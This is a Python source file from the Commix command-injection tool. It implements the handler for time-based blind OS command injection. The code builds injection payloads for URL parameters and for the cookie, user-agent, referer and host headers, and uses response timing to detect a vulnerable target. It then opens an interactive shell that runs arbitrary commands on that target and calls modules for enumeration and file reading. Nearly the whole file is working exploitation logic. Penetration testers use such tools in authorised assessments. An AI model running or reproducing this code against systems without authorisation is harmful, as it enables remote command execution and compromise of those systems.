#!/usr/bin/env python
# encoding: UTF-8

"""
This file is part of Commix Project (https://commixproject.com).
Copyright (c) 2014-2024 Anastasios Stasinopoulos (@ancst).

This program is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
(at your option) any later version.

For more see the file 'readme/COPYING' for copying permission.
"""

import re
import sys
import time
import string
import random
from src.utils import menu
from src.utils import logs
from src.utils import settings
from src.utils import common
from src.core.compat import xrange
from src.utils import session_handler
from src.core.requests import headers
from src.core.requests import requests
from src.core.requests import parameters
from src.core.injections.controller import checks
from src.thirdparty.six.moves import input as _input
from src.thirdparty.six.moves import urllib as _urllib
from src.core.injections.controller import shell_options
from src.thirdparty.colorama import Fore, Back, Style, init
from src.core.injections.blind.techniques.time_based import tb_injector
from src.core.injections.blind.techniques.time_based import tb_payloads
from src.core.injections.blind.techniques.time_based import tb_enumeration
from src.core.injections.blind.techniques.time_based import tb_file_access

"""
The "time-based" injection technique on Blind OS Command Injection.
"""

"""
The "time-based" injection technique handler.
"""
def tb_injection_handler(url, timesec, filename, http_request_method, url_time_response, injection_type, technique):

  counter = 1
  num_of_chars = 1
  vp_flag = True
  no_result = True
  is_encoded = False
  possibly_vulnerable = False
  false_positive_warning = False
  export_injection_info = False
  how_long = 0

  checks.testing_technique_title(injection_type, technique)

  # Check if defined "--url-reload" option.
  if menu.options.url_reload == True:
    checks.reload_url_msg(technique)

  # Check if defined "--maxlen" option.
  if menu.options.maxlen:
    settings.MAXLEN = maxlen = menu.options.maxlen

  #whitespace = checks.check_whitespaces()
  # Calculate all possible combinations
  total = len(settings.WHITESPACES) * len(settings.PREFIXES) * len(settings.SEPARATORS) * len(settings.SUFFIXES)
  for whitespace in settings.WHITESPACES:
    for prefix in settings.PREFIXES:
      for suffix in settings.SUFFIXES:
        for separator in settings.SEPARATORS:
          # Check injection state
          settings.DETECTION_PHASE = True
          settings.EXPLOITATION_PHASE = False
          # If a previous session is available.
          how_long_statistic = []
          if settings.LOAD_SESSION and session_handler.notification(url, technique, injection_type):
            try:
              settings.TIME_BASED_STATE = True
              cmd = shell = ""
              url, technique, injection_type, separator, shell, vuln_parameter, prefix, suffix, TAG, alter_shell, payload, http_request_method, url_time_response, timesec, how_long, output_length, is_vulnerable = session_handler.injection_point_exportation(url, http_request_method)
              checks.check_for_stored_tamper(payload)
              settings.FOUND_HOW_LONG = how_long
              settings.FOUND_DIFF = how_long - timesec
            except TypeError:
              checks.error_loading_session_file()

          if settings.RETEST == True:
            settings.RETEST = False
            from src.core.injections.results_based.techniques.classic import cb_handler
            cb_handler.exploitation(url, timesec, filename, http_request_method, injection_type=settings.INJECTION_TYPE.RESULTS_BASED_CI, technique=settings.INJECTION_TECHNIQUE.CLASSIC)
            checks.testing_technique_title(injection_type, technique)

          if not settings.LOAD_SESSION:
            num_of_chars = num_of_chars + 1
            # Check for bad combination of prefix and separator
            combination = prefix + separator
            if combination in settings.JUNK_COMBINATION:
              prefix = ""

            # Define alter shell
            alter_shell = menu.options.alter_shell

            # Change TAG on every request to prevent false-positive results.
            TAG = ''.join(random.choice(string.ascii_uppercase) for num_of_chars in range(6))
            tag_length = len(TAG) + 4

            for output_length in range(1, int(tag_length)):
              try:
                if alter_shell:
                  # Time-based decision payload (check if host is vulnerable).
                  payload = tb_payloads.decision_alter_shell(separator, TAG, output_length, timesec, http_request_method)
                else:
                  # Time-based decision payload (check if host is vulnerable).
                  payload = tb_payloads.decision(separator, TAG, output_length, timesec, http_request_method)

                # Fix prefixes / suffixes
                payload = parameters.prefixes(payload, prefix)
                payload = parameters.suffixes(payload, suffix)

                # Whitespace fixation
                payload = payload.replace(settings.SINGLE_WHITESPACE, whitespace)

                # Perform payload modification
                payload = checks.perform_payload_modification(payload)

                # Check if defined "--verbose" option.
                if settings.VERBOSITY_LEVEL != 0:
                  payload_msg = payload.replace("\n", "\\n")
                  settings.print_data_to_stdout(settings.print_payload(payload_msg))

                # Cookie header injection
                if settings.COOKIE_INJECTION == True:
                  # Check if target host is vulnerable to cookie header injection.
                  vuln_parameter = parameters.specify_cookie_parameter(menu.options.cookie)
                  how_long = tb_injector.cookie_injection_test(url, vuln_parameter, payload, http_request_method)

                # User-Agent HTTP header injection
                elif settings.USER_AGENT_INJECTION == True:
                  # Check if target host is vulnerable to user-agent HTTP header injection.
                  vuln_parameter = parameters.specify_user_agent_parameter(menu.options.agent)
                  how_long = tb_injector.user_agent_injection_test(url, vuln_parameter, payload, http_request_method)

                # Referer HTTP header injection
                elif settings.REFERER_INJECTION == True:
                  # Check if target host is vulnerable to referer HTTP header injection.
                  vuln_parameter = parameters.specify_referer_parameter(menu.options.referer)
                  how_long = tb_injector.referer_injection_test(url, vuln_parameter, payload, http_request_method)

                # Host HTTP header injection
                elif settings.HOST_INJECTION == True:
                  # Check if target host is vulnerable to host HTTP header injection.
                  vuln_parameter = parameters.specify_host_parameter(menu.options.host)
                  how_long = tb_injector.host_injection_test(url, vuln_parameter, payload, http_request_method)

                # Custom HTTP header Injection
                elif settings.CUSTOM_HEADER_INJECTION == True:
                  # Check if target host is vulnerable to custom http header injection.
                  vuln_parameter = parameters.specify_custom_header_parameter(settings.INJECT_TAG)
                  how_long = tb_injector.custom_header_injection_test(url, vuln_parameter, payload, http_request_method)

                else:
                  # Check if target host is vulnerable.
                  how_long, vuln_parameter = tb_injector.injection_test(payload, http_request_method, url)

                # Statistical analysis in time responses.
                how_long_statistic.append(how_long)

                # Injection percentage calculation
                percent, float_percent = checks.percentage_calculation(num_of_chars, total)

                if percent == 100 and no_result == True:
                  if settings.VERBOSITY_LEVEL == 0:
                    percent = settings.FAIL_STATUS
                  else:
                    percent = ""
                else:
                  if checks.time_relative_shell(url_time_response, how_long, timesec):
                    # Time relative false positive fixation.
                    false_positive_fixation = False
                    if len(TAG) == output_length:

                      # Simple statical analysis
                      statistical_anomaly = True
                      if len(set(how_long_statistic[0:5])) == 1:
                        if max(xrange(len(how_long_statistic)), key=lambda x: how_long_statistic[x]) == len(TAG) - 1:
                          statistical_anomaly = False
                          how_long_statistic = []

                      if timesec <= how_long and not statistical_anomaly:
                        false_positive_fixation = True
                      else:
                        false_positive_warning = True

                    # Identified false positive warning message.
                    if false_positive_warning:
                      timesec, false_positive_fixation = checks.time_delay_due_to_unstable_request(timesec)

                    if settings.VERBOSITY_LEVEL == 0:
                      percent = ".. (" + str(float_percent) + "%)"
                      checks.injection_process(injection_type, technique, percent)

                    # Check if false positive fixation is True.
                    if false_positive_fixation:
                      false_positive_fixation = False
                      settings.FOUND_HOW_LONG = how_long
                      settings.FOUND_DIFF = how_long - timesec
                      if false_positive_warning:
                        time.sleep(1)
                      randv1 = random.randrange(1, 10)
                      randv2 = random.randrange(1, 10)
                      randvcalc = randv1 + randv2

                      if settings.TARGET_OS == settings.OS.WINDOWS:
                        if alter_shell:
                          cmd = settings.WIN_PYTHON_INTERPRETER + "python.exe -c \"print (" + str(randv1) + " + " + str(randv2) + ")\""
                        else:
                          rand_num = randv1 + randv2
                          cmd = "powershell.exe -InputFormat none write (" + str(rand_num) + ")"
                      else:
                        cmd = "expr " + str(randv1) + " %2B " + str(randv2) + ""

                      # Set the original delay time
                      original_how_long = how_long

                      # Check for false positive resutls
                      how_long, output = tb_injector.false_positive_check(separator, TAG, cmd, whitespace, prefix, suffix, timesec, http_request_method, url, vuln_parameter, randvcalc, alter_shell, how_long, url_time_response, false_positive_warning)

                      if checks.time_relative_shell(url_time_response, how_long, timesec) :
                        if str(output) == str(randvcalc) and len(TAG) == output_length:
                          possibly_vulnerable = True
                          how_long_statistic = 0
                          if settings.VERBOSITY_LEVEL == 0:
                            percent = settings.info_msg
                          else:
                            percent = ""
                      else:
                        break
                        
                    # False positive
                    else:
                      percent = ".. (" + str(float_percent) + "%)"
                      checks.injection_process(injection_type, technique, percent)
                      continue
                  else:
                    percent = ".. (" + str(float_percent) + "%)"
                    checks.injection_process(injection_type, technique, percent)
                    continue

              except (KeyboardInterrupt, SystemExit):
                settings.print_data_to_stdout(settings.SINGLE_WHITESPACE)
                raise

              except EOFError:
                if settings.STDIN_PARSING:
                  settings.print_data_to_stdout(settings.SINGLE_WHITESPACE)
                err_msg = "Exiting, due to EOFError."
                settings.print_data_to_stdout(settings.print_error_msg(err_msg))
                raise

              except:
                percent = ((num_of_chars * 100) / total)
                float_percent = "{0:.1f}".format(round(((num_of_chars*100)/(total*1.0)),2))
                if str(float_percent) == "100.0":
                  if no_result == True:
                    if settings.VERBOSITY_LEVEL == 0:
                      percent = settings.FAIL_STATUS
                      checks.injection_process(injection_type, technique, percent)
                    else:
                      percent = ""
                  else:
                    percent = ".. (" + str(float_percent) + "%)"
                    settings.print_data_to_stdout(settings.SINGLE_WHITESPACE)
                    # Print logs notification message
                    logs.logs_notification(filename)
                  #raise
                else:
                  percent = ".. (" + str(float_percent) + "%)"
              break

          # Yaw, got shellz!
          # Do some magic tricks!
          if checks.time_relative_shell(url_time_response, how_long, timesec):
            if (len(TAG) == output_length) and \
               (possibly_vulnerable == True or settings.LOAD_SESSION and int(is_vulnerable) == menu.options.level):

              found = True
              no_result = False
              checks.identified_vulnerable_param(url, technique, injection_type, vuln_parameter, payload, http_request_method, filename, export_injection_info, vp_flag, counter)
              # Export session
              if not settings.LOAD_SESSION:
                shell = ""
                session_handler.injection_point_importation(url, technique, injection_type, separator, shell, vuln_parameter, prefix, suffix, TAG, alter_shell, payload, http_request_method, url_time_response, timesec, original_how_long, output_length, is_vulnerable=menu.options.level)
              else:
                whitespace = settings.WHITESPACES[0]
                settings.LOAD_SESSION = False

              # Check for any enumeration options.
              tb_enumeration.stored_session(separator, maxlen, TAG, cmd, prefix, suffix, whitespace, timesec, http_request_method, url, vuln_parameter, alter_shell, filename, url_time_response)
              # Check for any system file access options.
              tb_file_access.stored_session(separator, maxlen, TAG, cmd, prefix, suffix, whitespace, timesec, http_request_method, url, vuln_parameter, alter_shell, filename, url_time_response)
              # Check if defined single cmd.
              if menu.options.os_cmd:
                cmd = menu.options.os_cmd
                check_how_long, output = tb_enumeration.single_os_cmd_exec(separator, maxlen, TAG, cmd, prefix, suffix, whitespace, timesec, http_request_method, url, vuln_parameter, alter_shell, filename, url_time_response)

              # Pseudo-Terminal shell
              try:
                checks.alert()
                go_back = False
                go_back_again = False
                while True:
                  if go_back == True:
                    break
                  gotshell = checks.enable_shell(url)                  
                  if gotshell in settings.CHOICE_YES:
                    settings.print_data_to_stdout(settings.OS_SHELL_TITLE)
                    if settings.READLINE_ERROR:
                      checks.no_readline_module()
                    while True:
                      if false_positive_warning:
                        checks.time_delay_recommendation()
                        false_positive_warning = False
                      if not settings.READLINE_ERROR:
                        checks.tab_autocompleter()
                      settings.print_data_to_stdout(settings.END_LINE.CR + settings.OS_SHELL)
                      cmd = common.read_input(message="", default="os_shell", check_batch=True)
                      cmd = checks.escaped_cmd(cmd)
                      if cmd.lower() in settings.SHELL_OPTIONS:
                        go_back, go_back_again = shell_options.check_option(separator, TAG, cmd, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, alter_shell, filename, technique, go_back, no_result, timesec, go_back_again, payload, OUTPUT_TEXTFILE="")
                        if go_back and go_back_again == False:
                          break
                        if go_back and go_back_again:
                          return True
                      else:
                        if menu.options.ignore_session or \
                           session_handler.export_stored_cmd(url, cmd, vuln_parameter) == None:
                          # The main command injection exploitation.
                          check_how_long, output = tb_injector.injection(separator, maxlen, TAG, cmd, prefix, suffix, whitespace, timesec, http_request_method, url, vuln_parameter, alter_shell, filename, url_time_response)
                          # Export injection result
                          tb_injector.export_injection_results(cmd, separator, output, check_how_long)
                          if not menu.options.ignore_session :
                            session_handler.store_cmd(url, cmd, output, vuln_parameter)
                        else:
                          output = session_handler.export_stored_cmd(url, cmd, vuln_parameter)
                          settings.print_data_to_stdout(settings.print_output(output))
                        # Update logs with executed cmds and execution results.
                        logs.executed_command(filename, cmd, output)
                  elif gotshell in settings.CHOICE_NO:
                    if checks.next_attack_vector(technique, go_back) == True:
                      break
                    else:
                      if no_result == True:
                        return False
                      else:
                        return True
                  elif gotshell in settings.CHOICE_QUIT:
                    raise SystemExit()

                  else:
                    common.invalid_option(gotshell)
                    pass
                  # break

              except (KeyboardInterrupt, SystemExit):
                raise

              except EOFError:
                if settings.STDIN_PARSING:
                  settings.print_data_to_stdout(settings.SINGLE_WHITESPACE)
                err_msg = "Exiting, due to EOFError."
                settings.print_data_to_stdout(settings.print_error_msg(err_msg))
                raise

  if no_result == True:
    if settings.VERBOSITY_LEVEL == 0:
      settings.print_data_to_stdout(settings.SINGLE_WHITESPACE)
    return False

  else :
    settings.print_data_to_stdout(settings.END_LINE.CR)
    

"""
The exploitation function.
(call the injection handler)
"""
def exploitation(url, timesec, filename, http_request_method, url_time_response, injection_type, technique):
  # Check if attack is based on time delays.
  if not settings.TIME_RELATIVE_ATTACK :
    checks.time_relative_attaks_msg()
    settings.TIME_RELATIVE_ATTACK = True

  if url_time_response >= settings.SLOW_TARGET_RESPONSE:
    warn_msg = "It is highly recommended, due to serious response delays, "
    warn_msg += "to skip the time-based (blind) technique and to continue "
    warn_msg += "with the file-based (semiblind) technique."
    settings.print_data_to_stdout(settings.print_warning_msg(warn_msg))
    go_back = False
    while True:
      if go_back == True:
        return False
      message = "How do you want to proceed? [(C)ontinue/(s)kip] > "
      proceed_option = common.read_input(message, default="C", check_batch=True)
      if proceed_option.lower() in settings.CHOICE_PROCEED :
        if proceed_option.lower() == "c":
          if tb_injection_handler(url, timesec, filename, http_request_method, url_time_response, injection_type, technique) == False:
            return False
        elif proceed_option.lower() == "s":
          from src.core.injections.semiblind.techniques.file_based import fb_handler
          fb_handler.exploitation(url, timesec, filename, http_request_method, url_time_response, injection_type, technique)
        elif proceed_option.lower() == "q":
          raise SystemExit()
      else:
        common.invalid_option(proceed_option)
        pass
  else:
    if tb_injection_handler(url, timesec, filename, http_request_method, url_time_response, injection_type, technique) == False:
      settings.TIME_RELATIVE_ATTACK = False
      return False
# eof
